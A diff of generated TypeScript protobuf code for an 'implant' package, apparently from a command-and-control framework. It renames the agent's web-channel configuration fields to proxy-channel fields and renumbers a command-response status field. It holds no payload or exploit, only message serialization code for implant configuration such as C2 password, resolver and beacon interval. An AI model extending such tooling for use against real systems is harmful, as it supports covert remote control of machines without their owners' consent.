@@ -37,17 +37,17 @@ export interface AgentConfig {
      */
     c2IntervalMs?: UInt32Value;
     /**
-     * @generated from protobuf field: google.protobuf.BoolValue use_web_channel = 5;
+     * @generated from protobuf field: google.protobuf.BoolValue use_proxy_channel = 5;
      */
-    useWebChannel?: BoolValue;
+    useProxyChannel?: BoolValue;
     /**
-     * @generated from protobuf field: google.protobuf.StringValue web_url = 6;
+     * @generated from protobuf field: google.protobuf.StringValue proxy_url = 6;
      */
-    webUrl?: StringValue;
+    proxyUrl?: StringValue;
     /**
-     * @generated from protobuf field: google.protobuf.StringValue web_key = 7;
+     * @generated from protobuf field: google.protobuf.StringValue proxy_key = 7;
      */
-    webKey?: StringValue;
+    proxyKey?: StringValue;
     /**
      * @generated from protobuf field: google.protobuf.BoolValue throttle_sendq = 8;
      */
@@ -114,7 +114,7 @@ export interface Command_Response {
      */
     data: Uint8Array;
     /**
-     * @generated from protobuf field: implant.AgentCommandStatus status = 4;
+     * @generated from protobuf field: implant.AgentCommandStatus status = 3;
      */
     status: AgentCommandStatus;
 }
@@ -249,9 +249,9 @@ class AgentConfig$Type extends MessageType<AgentConfig> {
             { no: 2, name: "c2_password", kind: "scalar", T: 9 /*ScalarType.STRING*/ },
             { no: 3, name: "resolver", kind: "message", T: () => StringValue },
             { no: 4, name: "c2_interval_ms", kind: "message", T: () => UInt32Value },
-            { no: 5, name: "use_web_channel", kind: "message", T: () => BoolValue },
-            { no: 6, name: "web_url", kind: "message", T: () => StringValue },
-            { no: 7, name: "web_key", kind: "message", T: () => StringValue },
+            { no: 5, name: "use_proxy_channel", kind: "message", T: () => BoolValue },
+            { no: 6, name: "proxy_url", kind: "message", T: () => StringValue },
+            { no: 7, name: "proxy_key", kind: "message", T: () => StringValue },
             { no: 8, name: "throttle_sendq", kind: "message", T: () => BoolValue }
         ]);
     }
@@ -280,14 +280,14 @@ class AgentConfig$Type extends MessageType<AgentConfig> {
                 case /* google.protobuf.UInt32Value c2_interval_ms */ 4:
                     message.c2IntervalMs = UInt32Value.internalBinaryRead(reader, reader.uint32(), options, message.c2IntervalMs);
                     break;
-                case /* google.protobuf.BoolValue use_web_channel */ 5:
-                    message.useWebChannel = BoolValue.internalBinaryRead(reader, reader.uint32(), options, message.useWebChannel);
+                case /* google.protobuf.BoolValue use_proxy_channel */ 5:
+                    message.useProxyChannel = BoolValue.internalBinaryRead(reader, reader.uint32(), options, message.useProxyChannel);
                     break;
-                case /* google.protobuf.StringValue web_url */ 6:
-                    message.webUrl = StringValue.internalBinaryRead(reader, reader.uint32(), options, message.webUrl);
+                case /* google.protobuf.StringValue proxy_url */ 6:
+                    message.proxyUrl = StringValue.internalBinaryRead(reader, reader.uint32(), options, message.proxyUrl);
                     break;
-                case /* google.protobuf.StringValue web_key */ 7:
-                    message.webKey = StringValue.internalBinaryRead(reader, reader.uint32(), options, message.webKey);
+                case /* google.protobuf.StringValue proxy_key */ 7:
+                    message.proxyKey = StringValue.internalBinaryRead(reader, reader.uint32(), options, message.proxyKey);
                     break;
                 case /* google.protobuf.BoolValue throttle_sendq */ 8:
                     message.throttleSendq = BoolValue.internalBinaryRead(reader, reader.uint32(), options, message.throttleSendq);
@@ -316,15 +316,15 @@ class AgentConfig$Type extends MessageType<AgentConfig> {
         /* google.protobuf.UInt32Value c2_interval_ms = 4; */
         if (message.c2IntervalMs)
             UInt32Value.internalBinaryWrite(message.c2IntervalMs, writer.tag(4, WireType.LengthDelimited).fork(), options).join();
-        /* google.protobuf.BoolValue use_web_channel = 5; */
-        if (message.useWebChannel)
-            BoolValue.internalBinaryWrite(message.useWebChannel, writer.tag(5, WireType.LengthDelimited).fork(), options).join();
-        /* google.protobuf.StringValue web_url = 6; */
-        if (message.webUrl)
-            StringValue.internalBinaryWrite(message.webUrl, writer.tag(6, WireType.LengthDelimited).fork(), options).join();
-        /* google.protobuf.StringValue web_key = 7; */
-        if (message.webKey)
-            StringValue.internalBinaryWrite(message.webKey, writer.tag(7, WireType.LengthDelimited).fork(), options).join();
+        /* google.protobuf.BoolValue use_proxy_channel = 5; */
+        if (message.useProxyChannel)
+            BoolValue.internalBinaryWrite(message.useProxyChannel, writer.tag(5, WireType.LengthDelimited).fork(), options).join();
+        /* google.protobuf.StringValue proxy_url = 6; */
+        if (message.proxyUrl)
+            StringValue.internalBinaryWrite(message.proxyUrl, writer.tag(6, WireType.LengthDelimited).fork(), options).join();
+        /* google.protobuf.StringValue proxy_key = 7; */
+        if (message.proxyKey)
+            StringValue.internalBinaryWrite(message.proxyKey, writer.tag(7, WireType.LengthDelimited).fork(), options).join();
         /* google.protobuf.BoolValue throttle_sendq = 8; */
         if (message.throttleSendq)
             BoolValue.internalBinaryWrite(message.throttleSendq, writer.tag(8, WireType.LengthDelimited).fork(), options).join();
@@ -503,7 +503,7 @@ class Command_Response$Type extends MessageType<Command_Response> {
         super("implant.Command.Response", [
             { no: 1, name: "command", kind: "enum", T: () => ["implant.AgentCommand", AgentCommand, "AGENT_COMMAND_"] },
             { no: 2, name: "data", kind: "scalar", T: 12 /*ScalarType.BYTES*/ },
-            { no: 4, name: "status", kind: "enum", T: () => ["implant.AgentCommandStatus", AgentCommandStatus] }
+            { no: 3, name: "status", kind: "enum", T: () => ["implant.AgentCommandStatus", AgentCommandStatus] }
         ]);
     }
     create(value?: PartialMessage<Command_Response>): Command_Response {
@@ -526,7 +526,7 @@ class Command_Response$Type extends MessageType<Command_Response> {
                 case /* bytes data */ 2:
                     message.data = reader.bytes();
                     break;
-                case /* implant.AgentCommandStatus status */ 4:
+                case /* implant.AgentCommandStatus status */ 3:
                     message.status = reader.int32();
                     break;
                 default:
@@ -547,9 +547,9 @@ class Command_Response$Type extends MessageType<Command_Response> {
         /* bytes data = 2; */
         if (message.data.length)
             writer.tag(2, WireType.LengthDelimited).bytes(message.data);
-        /* implant.AgentCommandStatus status = 4; */
+        /* implant.AgentCommandStatus status = 3; */
         if (message.status !== 0)
-            writer.tag(4, WireType.Varint).int32(message.status);
+            writer.tag(3, WireType.Varint).int32(message.status);
         let u = options.writeUnknownFields;
         if (u !== false)
             (u == true ? UnknownFieldHandler.onWrite : u)(this.typeName, message, writer);
